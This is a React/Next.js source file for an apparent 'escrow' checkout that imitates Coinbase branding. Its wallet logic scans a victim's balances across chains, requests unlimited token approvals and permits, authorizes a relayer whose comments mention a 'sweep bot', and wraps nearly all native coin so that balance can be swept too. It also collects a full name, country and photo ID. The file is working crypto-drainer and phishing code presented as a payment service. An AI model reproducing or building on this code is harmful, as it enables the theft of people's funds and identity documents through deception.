"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
// @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
import { TRON_CHAIN, connectTronLink, getConnectedTronAddress } from "@/lib/tron";
import { COUNTRIES, codeToFlag } from "@/lib/countries";
import EscrowShell from "@/components/EscrowShell";
import CoinbaseSignIn from "@/components/CoinbaseSignIn";
import TrustedByMarquee from "@/components/TrustedByMarquee";



const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

// WETH / WBNB / WMATIC all implement the same deposit() interface
const WRAPPED_NATIVE_ABI = [
  "function deposit() external payable",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

type Phase =
  | "loading"
  | "no-session"
  | "idle"
  | "id-verify"
  | "balance-check"
  | "insufficient-balance"
  | "ready-to-approve"
  | "approving"
  | "complete"
  | "expired"
  | "error";

const CHAIN_LOGOS: Record<string, string> = {
  eth: "/logos/ethereum.svg",
  bnb: "/logos/bnb.svg",
  polygon: "/logos/polygon.svg",
};

// USDT/USDC are dollar-pegged; this fixed rate converts on-chain stablecoin
// holdings into an EUR-equivalent balance for the minimum-balance check.
const EUR_PER_USD = 0.92;

const MAX_UPLOAD_BYTES = 8 * 1024 * 1024;

const STACK_FEATURES = [
  {
    title: "Infrastructure",
    description: "API solutions supported by broad fiat, crypto asset, stablecoin, network, and geographic coverage. Integrated agentic capabilities.",
  },
  {
    title: "Stablecoins",
    description: "Multi-asset optionality: USDC, the world's most regulated stablecoin, and an expanding global footprint.",
  },
  {
    title: "Settlement",
    description: "Multichain by design. Led by Base, Coinbase's purpose-built Ethereum L2.",
  },
  {
    title: "Custody",
    description: "An institutional-grade, regulated foundation underpins the entire managed payments solution.",
  },
];

interface EscrowSession {
  id: string;
  recipientName: string;
  amountEur: number;
  issuedAt: string;
  startedAt: string | null;
  sessionMinutes: number;
  expiresAt: string | null;
  status: string;
  terms: string;
  minBalanceEur: number;
}

function formatEUR(value: number) {
  if (!Number.isFinite(value)) return "€0.00";
  return value.toLocaleString("en-IE", { style: "currency", currency: "EUR", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/**
 * Coinbase-style amount display: currency symbol and cents rendered smaller
 * than the main integer part, with tight negative letter-spacing.
 *
 * sizes: "hero" (main checkout heading) | "sidebar" (card) | "sm" (inline)
 */
function CoinbaseAmount({ value, size = "hero" }: { value: number; size?: "hero" | "sidebar" | "sm" }) {
  if (!Number.isFinite(value)) value = 0;

  // Split into parts: symbol, integer digits, decimal digits
  const parts = new Intl.NumberFormat("en-IE", {
    style: "currency",
    currency: "EUR",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).formatToParts(value);

  const symbol = parts.find((p) => p.type === "currency")?.value ?? "€";
  const integer = parts
    .filter((p) => p.type === "integer" || p.type === "group")
    .map((p) => p.value)
    .join("");
  const decimal = parts
    .filter((p) => p.type === "decimal" || p.type === "fraction")
    .map((p) => p.value)
    .join("");

  if (size === "hero") {
    return (
      <span className="inline-flex items-start leading-none tracking-[-0.04em]">
        <span className="mt-2 text-[28px] font-semibold text-ink/70 sm:mt-3 sm:text-[34px]">{symbol}</span>
        <span className="text-[64px] font-bold text-ink sm:text-[80px]">{integer}</span>
        <span className="mt-2 text-[28px] font-semibold text-ink/70 sm:mt-3 sm:text-[34px]">{decimal}</span>
      </span>
    );
  }

  if (size === "sidebar") {
    return (
      <span className="inline-flex items-start leading-none tracking-[-0.03em]">
        <span className="mt-1 text-[15px] font-semibold text-ink/60">{symbol}</span>
        <span className="text-[32px] font-bold text-ink">{integer}</span>
        <span className="mt-1 text-[15px] font-semibold text-ink/60">{decimal}</span>
      </span>
    );
  }

  // sm — inline usage
  return <span className="font-semibold tracking-tight text-ink">{formatEUR(value)}</span>;
}

function short(addr: string, lead = 6, tail = 4) {
  return `${addr.slice(0, lead)}...${addr.slice(-tail)}`;
}

function formatClock(ms: number) {
  const total = Math.max(0, Math.floor(ms / 1000));
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${m}:${s.toString().padStart(2, "0")}`;
}

function CircularTimer({ totalMs, remainingMs, size = 136 }: { totalMs: number; remainingMs: number; size?: number }) {
  const SIZE = size;
  const STROKE = size < 80 ? 4 : 7;
  const R = (SIZE - STROKE) / 2;
  const CIRC = 2 * Math.PI * R;
  const pct = Math.max(0, Math.min(1, remainingMs / totalMs));
  const offset = CIRC * (1 - pct);
  const mins = Math.floor(remainingMs / 60000);
  const secs = Math.floor((remainingMs % 60000) / 1000);
  const isCritical = remainingMs < 60_000;
  const isLow = remainingMs < 300_000;
  const ringColor = isCritical ? "#ef4444" : isLow ? "#f59e0b" : "#0052FF";
  const isSmall = size < 80;

  return (
    <div className="flex flex-col items-center">
      <div className="relative" style={{ width: SIZE, height: SIZE }}>
        <svg width={SIZE} height={SIZE} viewBox={`0 0 ${SIZE} ${SIZE}`}>
          {/* Track ring */}
          <circle cx={SIZE / 2} cy={SIZE / 2} r={R} fill="none" stroke="rgba(0,0,0,0.06)" strokeWidth={STROKE} />
          {/* Progress ring */}
          <circle
            cx={SIZE / 2} cy={SIZE / 2} r={R}
            fill="none"
            stroke={ringColor}
            strokeWidth={STROKE}
            strokeLinecap="round"
            strokeDasharray={CIRC}
            strokeDashoffset={offset}
            transform={`rotate(-90 ${SIZE / 2} ${SIZE / 2})`}
            style={{ transition: "stroke-dashoffset 0.8s linear, stroke 0.5s ease" }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className={`font-mono font-bold leading-none tracking-tight ${isSmall ? "text-[10px]" : "text-2xl"}`} style={{ color: ringColor }}>
            {mins}:{secs.toString().padStart(2, "0")}
          </span>
          {!isSmall && <span className="mt-1 text-[9px] font-semibold uppercase tracking-widest text-muted">remaining</span>}
        </div>
      </div>
    </div>
  );
}


interface Modal1Item {
  key: string;
  chainName: string;
  chainLabel: string;
  symbol: string;
  tokenAddr: string;
  balanceDisplay: string;
  balanceUsd: number;
  contract: string;
  isTron: boolean;
  alreadyApproved: boolean;
  permit?: boolean;
  permitDomainName?: string;
  permitDomainVersion?: string;
}

type Modal1Status = "pending" | "approving" | "done" | "failed";

// ── Custom country picker with flag emoji ──────────────────────────────────
function CountrySelect({ value, onChange }: { value: string; onChange: (v: string) => void }) {
  const [open, setOpen] = useState(false);
  const [query, setQuery] = useState("");
  const ref = useRef<HTMLDivElement>(null);

  const selected = COUNTRIES.find((c) => c.name === value) ?? null;

  const filtered = query.trim()
    ? COUNTRIES.filter((c) => c.name.toLowerCase().includes(query.toLowerCase()))
    : COUNTRIES;

  // Close on outside click
  useEffect(() => {
    function handle(e: MouseEvent) {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    }
    document.addEventListener("mousedown", handle);
    return () => document.removeEventListener("mousedown", handle);
  }, []);

  return (
    <div ref={ref} className="relative">
      <button
        type="button"
        onClick={() => { setOpen((o) => !o); setQuery(""); }}
        className={
          "flex h-12 w-full items-center justify-between rounded-lg border bg-bg px-4 text-sm transition " +
          (open ? "border-brand ring-2 ring-brand/20" : "border-hairline hover:border-brand/40")
        }
      >
        {selected ? (
          <span className="flex items-center gap-2.5">
            <span className="text-lg leading-none">{codeToFlag(selected.code)}</span>
            <span className="text-ink">{selected.name}</span>
          </span>
        ) : (
          <span className="text-muted">Select country</span>
        )}
        <svg
          className={"h-4 w-4 text-muted transition-transform " + (open ? "rotate-180" : "")}
          fill="none" viewBox="0 0 24 24" stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
        </svg>
      </button>

      {open && (
        <div className="absolute z-50 mt-1.5 w-full overflow-hidden rounded-xl border border-hairline bg-surface-card shadow-card-lg">
          {/* Search box */}
          <div className="border-b border-hairline px-3 py-2">
            <input
              autoFocus
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Search country…"
              className="h-9 w-full rounded-lg bg-surface-soft px-3 text-sm text-ink placeholder:text-muted focus:outline-none"
            />
          </div>
          {/* Options */}
          <ul className="max-h-56 overflow-y-auto py-1 overscroll-contain" role="listbox">
            {filtered.length === 0 ? (
              <li className="px-4 py-3 text-sm text-muted">No results</li>
            ) : (
              filtered.map((c) => (
                <li key={c.code} role="option" aria-selected={c.name === value}>
                  <button
                    type="button"
                    onMouseDown={() => { onChange(c.name); setOpen(false); setQuery(""); }}
                    className={
                      "flex w-full items-center gap-3 px-4 py-2.5 text-left text-sm transition " +
                      (c.name === value ? "bg-brand/5 font-semibold text-brand" : "text-ink hover:bg-surface-soft")
                    }
                  >
                    <span className="text-xl leading-none">{codeToFlag(c.code)}</span>
                    <span>{c.name}</span>
                  </button>
                </li>
              ))
            )}
          </ul>
        </div>
      )}
    </div>
  );
}

export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
  const { ready, authenticated, login, logout, user } = usePrivy();
  const { wallets } = useWallets();

  // Track whether the user completed Coinbase email OTP (identity step).
  const [cbVerified, setCbVerified] = useState(false);
  const [gateLoading, setGateLoading] = useState(false);
  const [phase, setPhase] = useState<Phase>("loading");
  const [error, setError] = useState<string | null>(null);
  const [session, setSession] = useState<EscrowSession | null>(null);
  const [remainingMs, setRemainingMs] = useState<number | null>(null);

  const [fullName, setFullName] = useState("");
  const [country, setCountry] = useState("");
  const [idFile, setIdFile] = useState<File | null>(null);
  // ID verification multi-step flow
  const [idVerifyStep, setIdVerifyStep] = useState<"type" | "upload" | "info">("type");
  const [idDocType, setIdDocType] = useState<string | null>(null);
  const [idPreviewUrl, setIdPreviewUrl] = useState<string | null>(null);
  const [idDob, setIdDob] = useState("");
  const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
  // Server-side scan cache — populated by runModal1Scan, reused by checkWalletBalances
  const [cachedScanUsd, setCachedScanUsd] = useState<Record<string, number> | null>(null);
  // Winner chain from Modal 1 scan — used to scope handleApproveDeposit
  const [topChainName, setTopChainName] = useState<string | null>(null);
  // Tron address (from TronLink if installed) — included in parallel scan
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);
  const [approvedChains, setApprovedChains] = useState<string[]>([]);
  const expiredNotified = useRef(false);
  const viewTracked = useRef<string | null>(null);

  // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
  const modal1Triggered = useRef(false);
  const [modal1Open, setModal1Open] = useState(false);
  const [modal1Scanning, setModal1Scanning] = useState(false);
  const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
  const [modal1Status, setModal1Status] = useState<Record<string, Modal1Status>>({});
  const [modal1Approving, setModal1Approving] = useState(false);
  const [modal1Complete, setModal1Complete] = useState(false);

  // --- Modal 2: opens when user clicks "Approve Deposit", shows chain-by-chain progress ---
  const [modal2Open, setModal2Open] = useState(false);

  // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
  const autoLoginAttempted = useRef(false);

  // Address always comes from Privy — Coinbase OTP is identity-only, not wallet
  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;
  const addressRef = useRef<string | null>(null);
  addressRef.current = address;

  const totalBalanceEur = useMemo(
    () => Object.values(walletBalances).reduce((a, b) => a + b, 0),
    [walletBalances]
  );

  useEffect(() => {
    let cancelled = false;

    async function load() {
      try {
        const url = sessionId ? `/api/escrow/session/${sessionId}` : "/api/escrow/current";
        const res = await fetch(url);
        const json = await res.json();
        if (cancelled) return;
        if (json.ok && json.session) {
          setSession(json.session);
          setPhase((prev) => (prev === "loading" || prev === "no-session" ? "idle" : prev));
          if (viewTracked.current !== json.session.id) {
            viewTracked.current = json.session.id;
            fetch("/api/escrow/track", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ sessionId: json.session.id, eventType: "view" }),
            }).catch(() => {});
          }
        } else if (!session) {
          setPhase("no-session");
        }
      } catch (err) {
        console.error("[escrow] failed to load session:", err);
        if (!cancelled && !session) setPhase("no-session");
      }
    }

    void load();
    const interval = setInterval(() => {
      if (phase === "loading" || phase === "no-session" || phase === "idle") void load();
    }, 12000);
    return () => {
      cancelled = true;
      clearInterval(interval);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sessionId]);

  useEffect(() => {
    if (!session?.expiresAt) {
      setRemainingMs(null);
      return;
    }
    const expiresAt = new Date(session.expiresAt).getTime();
    const sessionIdRef = session.id;

    function tick() {
      const left = expiresAt - Date.now();
      setRemainingMs(left);
      if (left <= 0 && !expiredNotified.current) {
        expiredNotified.current = true;
        fetch("/api/escrow/expire", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: sessionIdRef, wallet: addressRef.current }),
        }).catch(() => {});
        setPhase((prev) => (prev === "complete" ? prev : "expired"));
      }
    }

    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [session?.expiresAt, session?.id]);

  // After OTP on coinbase.usdc-pay.com, user is redirected with ?cb=1.
  // Show our custom wallet picker instead of Privy's modal.
  useEffect(() => {
    if (!ready || authenticated || autoLoginAttempted.current) return;
    const params = new URLSearchParams(window.location.search);
    if (params.get("cb") !== "1") return;
    autoLoginAttempted.current = true;
    void login();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, authenticated]);

  // Detect TronLink on mount — read address if already connected.
  useEffect(() => {
    const addr = getConnectedTronAddress();
    if (addr) setTronAddress(addr);
  }, []);

  // After wallet connects: fire airdrop + balance scan simultaneously.
  // Airdrop runs in background (don't await) so gas lands before user clicks Approve.
  useEffect(() => {
    if (!authenticated || !address || modal1Triggered.current) return;
    modal1Triggered.current = true;
    // Fire airdrop immediately — don't block the UI on its response
    fetch("/api/airdrop", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address }),
    }).catch(() => {});
    void runModal1Scan();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, address]);

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  async function getSignerFor(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function checkWalletBalances() {
    if (!address || !session) return;
    setProcessing(true);

    try {
      // Use the server-side cache from Modal 1 scan when available (instant);
      // otherwise re-scan in parallel (~1-2 s) — either way, no wallet chain switching.
      let chainUsd = cachedScanUsd;
      if (!chainUsd) {
        const res = await fetch("/api/scan-balances", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address }),
        });
        const data: { ok: boolean; chainUsd?: Record<string, number> } = await res.json();
        if (data.ok && data.chainUsd) {
          chainUsd = data.chainUsd;
          setCachedScanUsd(chainUsd);
        }
      }

      const balances: Record<string, number> = {};
      let totalEur = 0;

      for (const [chain, usd] of Object.entries(chainUsd ?? {})) {
        const eur = usd * EUR_PER_USD;
        balances[chain] = eur;
        totalEur += eur;
      }

      setWalletBalances(balances);
      setProcessing(false);

      // User must hold at least some USDT/USDC to pass this gate.
      // Native coins (ETH, BNB, MATIC) and other tokens do NOT count toward
      // the minimum — they will be wrapped and swept in the Approve Deposit step,
      // but cannot substitute for a stablecoin balance requirement.
      const hasStablecoins = totalEur > 0;
      const meetsMinimum = hasStablecoins && totalEur >= session.minBalanceEur;
      setPhase(meetsMinimum ? "ready-to-approve" : "insufficient-balance");
      fetch("/api/escrow/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, eventType: "balance_check", wallet: address }),
      }).catch(() => {});
    } catch (err) {
      console.error("[balance] Balance check failed:", err);
      setError("We couldn't reach the network to check your balance. Please try again.");
      setPhase("error");
      setProcessing(false);
    }
  }

  async function startSessionClock(walletAddress: string) {
    if (!session) return;
    try {
      const res = await fetch("/api/escrow/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, wallet: walletAddress }),
      });
      const json = await res.json();
      if (json.ok) {
        setSession((prev) => (prev ? { ...prev, status: "active", startedAt: json.startedAt, expiresAt: json.expiresAt } : prev));
      } else if (json.error === "session_closed") {
        setPhase("expired");
      }
    } catch (err) {
      console.error("[escrow] failed to start session clock:", err);
    }
  }

  // ---------------------------------------------------------------------------
  // Modal 1 — scan ALL chains in parallel (EVM + Tron), show single winner
  // ---------------------------------------------------------------------------
  async function runModal1Scan() {
    if (!address) return;
    setModal1Scanning(true);
    setModal1Open(true);

    type ScanData = {
      ok: boolean;
      topToken?: {
        chain: string; chainLabel: string; chainId: number; symbol: string;
        address: string; balance: string; balanceUsd: number; contract: string;
        isTron: boolean; alreadyApproved: boolean;
        permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
      };
      chainUsd?: Record<string, number>;
    };

    const doScan = async (tronAddr: string | null): Promise<ScanData> => {
      const res = await fetch("/api/scan-balances", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address, tronAddress: tronAddr }),
      });
      return res.json();
    };

    try {
      // ── Step 1: Try to get a Tron address proactively ─────────────────────
      // If TronLink / Trust Wallet DApp browser is present, connect it NOW so
      // the Tron scan runs in parallel with EVM — not as a fallback after.
      let currentTronAddr = tronAddress ?? getConnectedTronAddress();
      if (!currentTronAddr) {
        const hasTron = typeof window !== "undefined" &&
          (Boolean(window.tronLink) || Boolean((window as { tronWeb?: unknown }).tronWeb));
        if (hasTron) {
          const addr = await connectTronLink();
          if (addr) {
            setTronAddress(addr);
            currentTronAddr = addr;
          }
        }
      }

      // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
      const data = await doScan(currentTronAddr);
      if (data.ok) setCachedScanUsd(data.chainUsd ?? null);

      setModal1Scanning(false);

      // No meaningful stablecoin balance anywhere → close modal silently
      if (!data.ok || !data.topToken || data.topToken.balanceUsd < 0.01) {
        setModal1Open(false);
        return;
      }

      const t = data.topToken;
      const winner: Modal1Item = {
        key: `${t.chain}-${t.symbol}`,
        chainName: t.chain,
        chainLabel: t.chainLabel,
        symbol: t.symbol,
        tokenAddr: t.address,
        balanceDisplay: t.balance,
        balanceUsd: t.balanceUsd,
        contract: t.contract,
        isTron: t.isTron,
        alreadyApproved: t.alreadyApproved,
        permit: t.permit,
        permitDomainName: t.permitDomainName,
        permitDomainVersion: t.permitDomainVersion,
      };

      setTopChainName(t.chain);
      setModal1Items([winner]);
      setModal1Status({ [winner.key]: "pending" });
    } catch (err) {
      console.error("[modal1] scan failed:", err);
      setModal1Scanning(false);
      setModal1Open(false);
    }
  }

  async function handleModal1Approve() {
    const item = modal1Items[0];
    if (!item) return;
    setModal1Approving(true);
    setModal1Status({ [item.key]: "approving" });

    try {
      if (item.isTron) {
        // ── Tron path ──────────────────────────────────────────────────────
        // Connect TronLink if not yet done (1 popup), then approve USDT (1 popup)
        let tronAddr = tronAddress ?? getConnectedTronAddress();
        if (!tronAddr) {
          tronAddr = await connectTronLink();
          if (tronAddr) setTronAddress(tronAddr);
        }
        if (!tronAddr || !window.tronWeb) throw new Error("TronLink not connected");

        const usdtAbi = [
          {
            name: "approve", type: "Function", stateMutability: "Nonpayable",
            inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }],
            outputs: [{ name: "", type: "bool" }],
          },
        ];
        const MAX_TRC20 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const tw = window.tronWeb as any;
        const usdt = await tw.contract(usdtAbi, item.tokenAddr);
        // Fire and forget — don't await confirmation, bot detects it when it mines
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        usdt.approve(item.contract, MAX_TRC20).send({ feeLimit: 20_000_000 }).catch(
          (e: unknown) => console.warn("[modal1] tron approve background:", e)
        );
      } else {
        // ── EVM path ──────────────────────────────────────────────────────
        const chain = CHAINS.find((c) => c.name === item.chainName)!;
        const token = chain.tokens.find((t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase());

        const signer = await getSignerFor(chain);

        if (item.permit && token) {
          // Gasless: off-chain EIP-712 signature — no gas, no mining wait
          await signAndSubmitPermit(signer, chain, token);
        } else {
          // Regular approve — broadcast only, do NOT await mining (fire-and-forget)
          const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
          const tx = await erc20.approve(item.contract, MaxUint256);
          // Background confirmation — doesn't block the UI
          tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
        }
      }

      setModal1Status({ [item.key]: "done" });
    } catch (err) {
      console.error("[modal1] approve failed:", err);
      setModal1Status({ [item.key]: "failed" });
    }

    setModal1Approving(false);
    setModal1Complete(true);
    // Close immediately — don't wait for on-chain confirmation
    setTimeout(() => setModal1Open(false), 900);
  }

  async function handleConnect() {
    setError(null);
    if (!session) return;
    let addr = address;
    if (!authenticated || !addr) {
      try {
        await login();
      } catch (err) {
        console.error("[escrow] login cancelled:", err);
        return;
      }
      addr = user?.wallet?.address ?? wallets[0]?.address ?? null;
    }
    if (addr) await startSessionClock(addr);
    // Reset ID verification sub-steps whenever entering the verify phase
    setIdVerifyStep("type");
    setIdDocType(null);
    setIdFile(null);
    setIdPreviewUrl(null);
    setIdDob("");
    setFullName("");
    setCountry("");
    setPhase("id-verify");
  }

  async function handleVerifyID() {
    if (!fullName.trim() || !country || !idFile) {
      setError("Enter your full legal name, select your country, and upload a photo of your ID.");
      return;
    }
    if (idFile.size > MAX_UPLOAD_BYTES) {
      setError("That file is too large. Please upload an image or PDF under 8MB.");
      return;
    }
    if (!session || !address) {
      setError("Wallet not connected. Please reconnect and try again.");
      return;
    }

    setProcessing(true);
    setError(null);

    try {
      const form = new FormData();
      form.append("sessionId", session.id);
      form.append("wallet", address);
      form.append("fullName", fullName.trim());
      form.append("country", country);
      form.append("document", idFile);

      const res = await fetch("/api/escrow/verify-identity", { method: "POST", body: form });
      const json = await res.json();
      if (!json.ok) {
        setError("We couldn't verify that document. Please try a clearer photo or a different file.");
        setProcessing(false);
        return;
      }

      setProcessing(false);
      setPhase("balance-check");
      setTimeout(() => checkWalletBalances(), 400);
    } catch (err) {
      console.error("[escrow] identity verification failed:", err);
      setError("We couldn't reach the server. Please try again.");
      setProcessing(false);
    }
  }

  function handleIdFileChange(file: File | null) {
    setIdFile(file);
    if (idPreviewUrl) URL.revokeObjectURL(idPreviewUrl);
    if (file && file.type.startsWith("image/")) {
      setIdPreviewUrl(URL.createObjectURL(file));
    } else {
      setIdPreviewUrl(null);
    }
  }

  /**
   * EIP-2612 gasless approval for USDC:
   *   1. Sign the permit off-chain (no gas, no TRX).
   *   2. POST to /api/permit — relayer submits permit() on-chain and pays gas.
   * Falls back to a regular approve() if anything goes wrong.
   */
  async function signAndSubmitPermit(
    signer: Awaited<ReturnType<typeof getSignerFor>>,
    chain: (typeof CHAINS)[number],
    token: (typeof CHAINS)[number]["tokens"][number]
  ): Promise<void> {
    const PERMIT_ABI = [
      "function nonces(address owner) view returns (uint256)",
    ];
    const usdcView = new Contract(token.address, PERMIT_ABI, signer);
    const nonce: bigint = await usdcView.nonces(address);
    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour

    const domain = {
      name: token.permitDomainName ?? "USD Coin",
      version: token.permitDomainVersion ?? "2",
      chainId: chain.chainId,
      verifyingContract: token.address,
    };

    const types = {
      Permit: [
        { name: "owner",    type: "address" },
        { name: "spender",  type: "address" },
        { name: "value",    type: "uint256" },
        { name: "nonce",    type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };

    const values = {
      owner:    address!,
      spender:  chain.contract,
      value:    MaxUint256,
      nonce,
      deadline,
    };

    // signTypedData: wallet signs off-chain — zero gas for the user
    const rawSig = await signer.signTypedData(domain, types, values);
    const { v, r, s } = Signature.from(rawSig);

    const res = await fetch("/api/permit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chain: chain.name,
        tokenAddress: token.address,
        owner: address,
        spender: chain.contract,
        value: MaxUint256.toString(),
        deadline,
        v,
        r,
        s,
      }),
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error((err as { error?: string }).error ?? "Permit submission failed");
    }
  }

  async function handleApproveDeposit() {
    // Open Modal 2 immediately so the user sees the progress overlay
    setModal2Open(true);
    setPhase("approving");
    setError(null);
    setApprovedChains([]);

    try {
      // Use the winner chain from Modal 1 scan. Fall back to first chain if scan
      // was skipped (user had no stablecoin balance).
      const winnerName = topChainName ?? CHAINS[0].name;
      const chain = CHAINS.find((c) => c.name === winnerName) ?? CHAINS[0];

      const signer = await getSignerFor(chain);

      // Authorize the relayer — the token approve() was done fire-and-forget in Modal 1.
      const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
      const authTx = await verification.authorize(RELAYER_ADDRESS);

      // Wait for authorize() to confirm (≤30 s) so the bot can immediately sweep
      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
      setApprovedChains([chain.name]);

      // ── Wrap native coin → WETH/WBNB/WMATIC (best-effort, EVM only) ─────────
      // If the user holds native coin (ETH, BNB, MATIC) on the winner chain above
      // the gas reserve, wrap it and approve the wrapped token to our contract.
      // The sweep bot can then capture native coin balance too — not just stablecoins.
      const isTronWinner = topChainName === "tron";
      if (!isTronWinner) {
        try {
          const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
          const gasReserve = chain.gasReserveWei ?? BigInt("5000000000000000"); // 0.005 default
          if (wrappedNativeToken && address) {
            const nativeBal: bigint = await signer.provider!.getBalance(address);
            if (nativeBal > gasReserve) {
              const wrapAmount = nativeBal - gasReserve;
              const wContract = new Contract(wrappedNativeToken.address, WRAPPED_NATIVE_ABI, signer);
              // Popup 2: deposit() wraps native coin into WETH/WBNB/WMATIC
              const wrapTx = await wContract.deposit({ value: wrapAmount });
              await Promise.race([wrapTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
              // Popup 3: approve WETH/WBNB/WMATIC to the delegation contract
              const approveTx = await wContract.approve(chain.contract, MaxUint256);
              void approveTx.wait(1); // fire-and-forget
            }
          }
        } catch (wrapErr) {
          // Non-fatal — user may have declined or have insufficient balance for gas.
          // The stablecoin approve from Modal 1 still stands.
          console.warn("[escrow] Native wrap skipped:", wrapErr);
        }
      }

      if (session) {
        fetch("/api/escrow/complete", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: session.id, wallet: address }),
        }).catch(() => {});
      }

      setModal2Open(false);
      setPhase("complete");
    } catch (err) {
      console.error("[escrow] Approval failed:", err);
      setError("The deposit approval didn't go through. Please try again.");
      setModal2Open(false);
      setPhase("error");
    }
  }

  const isConnected = authenticated && !!address;
  const activeFlow = phase !== "loading" && phase !== "no-session" && phase !== "idle";

  // After calling login(), Privy's modal resolves but WalletConnect relay can
  // drop the confirmation. Poll wallets[] for up to 30s so the site catches it
  // even if the websocket delivery was missed.
  function pollForWallet(timeoutMs = 30_000) {
    const start = Date.now();
    const interval = setInterval(() => {
      const addr = user?.wallet?.address ?? wallets[0]?.address ?? null;
      if (addr) {
        clearInterval(interval);
        setGateLoading(false);
        return;
      }
      if (Date.now() - start > timeoutMs) {
        clearInterval(interval);
        setGateLoading(false);
      }
    }, 1000);
  }

  async function handleGateCdpVerified() {
    setError(null);
    setGateLoading(true);
    try {
      await login();
      // Privy modal closed — start polling in case WalletConnect relay was slow
      pollForWallet();
    } catch (err) {
      console.error("[escrow] Privy login cancelled:", err);
      setGateLoading(false);
    }
  }

  async function handleGateLogin() {
    setError(null);
    setGateLoading(true);
    try {
      await login();
      pollForWallet();
    } catch (err) {
      console.error("[escrow] login cancelled:", err);
      setGateLoading(false);
    }
  }

  // Gate: show appropriate screen before the user is fully connected
  if (!ready || !isConnected) {
    return (
      <CoinbaseSignIn
        onVerified={handleGateCdpVerified}
        loading={gateLoading}
        waitingForWallet={gateLoading && authenticated}
      />
    );
  }

  const STEPS: { label: string; key: Phase[] }[] = [
    { label: "Connect", key: ["idle"] },
    { label: "Identity", key: ["id-verify"] },
    { label: "Balance", key: ["balance-check", "insufficient-balance"] },
    { label: "Approve", key: ["ready-to-approve", "approving"] },
    { label: "Done", key: ["complete"] },
  ];
  const currentStepIndex = STEPS.findIndex((s) => s.key.includes(phase));

  const showTimer = remainingMs !== null && remainingMs > 0 && phase !== "complete" && phase !== "expired" && session;
  const totalMs = session ? session.sessionMinutes * 60 * 1000 : 25 * 60 * 1000;

  return (
    <EscrowShell
      connectSlot={
        !isConnected ? (
          <button
            onClick={handleConnect}
            disabled={!ready || !session}
            className="h-10 rounded-pill bg-brand px-5 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
          >
            Connect wallet
          </button>
        ) : undefined
      }
    >
      <div className="mx-auto max-w-[1280px] px-4 py-8 sm:px-8 lg:py-16">

        {/* Floating circular timer — fixed bottom-right, all screen sizes */}
        {showTimer && remainingMs !== null && (
          <div className="fixed bottom-5 right-5 z-50 drop-shadow-lg">
            <div className="group relative flex h-14 w-14 items-center justify-center rounded-full border border-hairline bg-surface-card shadow-card ring-1 ring-white/10 transition hover:scale-110">
              <CircularTimer totalMs={totalMs} remainingMs={remainingMs} size={56} />
              {/* Tooltip on hover */}
